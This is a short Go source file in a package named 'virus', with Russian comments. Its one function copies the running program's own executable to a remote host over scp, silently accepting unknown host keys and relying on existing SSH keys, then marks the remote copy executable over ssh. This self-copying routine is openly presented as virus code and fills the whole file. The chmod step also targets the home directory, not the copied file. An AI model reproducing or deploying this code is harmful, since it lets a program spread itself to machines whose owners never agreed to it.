package virus

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
)

// Virus копирует текущий исполняемый файл на удаленный сервер через SCP.
// Параметр path должен быть в формате "user@ip" или просто "ip".
// Используется аутентификация по SSH-ключам (пароль не поддерживается).
func Virus(path string) error {
	// Определяем путь к текущему исполняемому файлу
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("не удалось определить путь к исполняемому файлу: %v", err)
	}

	// Парсим строку подключения
	var username, host string
	if strings.Contains(path, "@") {
		parts := strings.Split(path, "@")
		if len(parts) != 2 {
			return fmt.Errorf("неверный формат пути. Ожидается user@ip")
		}
		username = parts[0]
		host = parts[1]
	} else {
		// Просто IP адрес или хостнейм, используем текущего пользователя
		host = path
		// Получаем текущего пользователя системы
		current, err := user.Current()
		if err != nil {
			// Fallback на переменную окружения
			username = os.Getenv("USER")
			if username == "" {
				username = "root"
			}
		} else {
			username = current.Username
		}
	}

	// Целевой путь на удалённом сервере
	remotePath := fmt.Sprintf("/home/%s", username)
	if username == "root" {
		remotePath = "/root"
	}

	// Строим команду SCP (без пароля, полагаемся на SSH-ключи)
	cmd := exec.Command("scp", "-o", "StrictHostKeyChecking=no", exe, fmt.Sprintf("%s@%s:%s", username, host, remotePath))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	fmt.Printf("Копирование %s на %s@%s:%s...\n", filepath.Base(exe), username, host, remotePath)
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("ошибка SCP: %v", err)
	}

	// Устанавливаем права на выполнение на удалённом сервере
	chmodCmd := exec.Command("ssh", "-o", "StrictHostKeyChecking=no", fmt.Sprintf("%s@%s", username, host), "chmod", "+x", remotePath)
	chmodCmd.Stdout = os.Stdout
	chmodCmd.Stderr = os.Stderr
	if err := chmodCmd.Run(); err != nil {
		fmt.Printf("Предупреждение: не удалось установить права на выполнение на удалённом сервере: %v\n", err)
	}

	fmt.Printf("Успешно скопировано на %s:%s\n", host, remotePath)
	return nil
}
